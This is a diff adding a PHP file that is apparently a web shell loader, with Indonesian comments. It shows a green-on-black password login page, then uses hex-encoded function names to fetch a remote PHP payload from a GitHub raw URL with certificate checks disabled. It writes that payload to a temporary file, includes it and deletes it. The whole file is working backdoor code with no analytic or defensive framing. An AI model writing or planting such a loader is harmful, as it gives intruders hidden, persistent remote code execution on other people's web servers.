@@ -1,0 +1,104 @@
+<?php
+session_start();
+
+// ---------------- PASSWORD ----------------
+// Ganti dengan hash password pilihanmu (hasil password_hash("password", PASSWORD_BCRYPT))
+$secure_password_hash = '$2a$12$AulKg6bFQPJrHZ0/YSCPse2uXJ8gzPR.bwfuZ.Xms3nmNbR3AdtYi';
+$session_key = hash('sha256', $_SERVER['HTTP_HOST'] . '_aptisme_v2');
+
+// ---------------- FORM LOGIN ----------------
+function show_login_form($error = '')
+{
+    $errhtml = $error ? "<div style='color:#ff6666;margin-top:10px;'>".htmlspecialchars($error)."</div>" : "";
+    echo <<<HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Aptisme Login</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}
+.box{background:#111;padding:30px;border:2px solid #0f0;border-radius:10px;width:300px;}
+input{width:100%;padding:10px;margin-top:10px;background:#000;color:#0f0;border:1px solid #0f0;}
+input[type=submit]{background:#0f0;color:#000;font-weight:bold;cursor:pointer;}
+input[type=submit]:hover{background:#00b300;}
+</style>
+</head>
+<body>
+<div class="box">
+<form method="post">
+<label>Password:</label>
+<input type="password" name="password" required>
+<input type="submit" value="Login">
+</form>
+{$errhtml}
+</div>
+</body>
+</html>
+HTML;
+    exit;
+}
+
+// ---------------- CEK LOGIN ----------------
+if (!isset($_SESSION[$session_key])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if (password_verify($_POST['password'], $secure_password_hash)) {
+            $_SESSION[$session_key] = true;
+        } else {
+            show_login_form('Password salah!');
+        }
+    } else {
+        show_login_form();
+    }
+}
+
+// ---------------- FUNCTION BANTU ----------------
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex); $i += 2) {
+        $str .= chr(hexdec(substr($hex, $i, 2)));
+    }
+    return $str;
+}
+
+function geturlsinfo($destiny) {
+    $methods = array(
+        hex2str('666f70656e'), 
+        hex2str('73747265616d5f6765745f636f6e74656e7473'), 
+        hex2str('66696c655f6765745f636f6e74656e7473'),
+        hex2str('6375726c5f65786563')
+    );
+
+    if (function_exists($methods[3])) { // curl_exec
+        $ch = curl_init($destiny);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible)");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $result = $methods[3]($ch);
+        curl_close($ch);
+        return $result;
+    } elseif (function_exists($methods[2])) { // file_get_contents
+        return $methods[2]($destiny);
+    } elseif (function_exists($methods[0]) && function_exists($methods[1])) { // fopen + stream_get_contents
+        $handle = $methods[0]($destiny, "r");
+        $result = $methods[1]($handle);
+        fclose($handle);
+        return $result;
+    }
+    return false;
+}
+
+// ---------------- AMBIL & JALANKAN PAYLOAD ----------------
+$target_url = 'https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/alfacopet.php.txt';
+$payload = geturlsinfo($target_url);
+
+if ($payload !== false) {
+    // Simpan ke file sementara
+    $tmpfile = __DIR__ . '/temp_payload.php';
+    file_put_contents($tmpfile, $payload);
+    include $tmpfile; // include file
+    unlink($tmpfile); // hapus file setelah include
+}
+?>
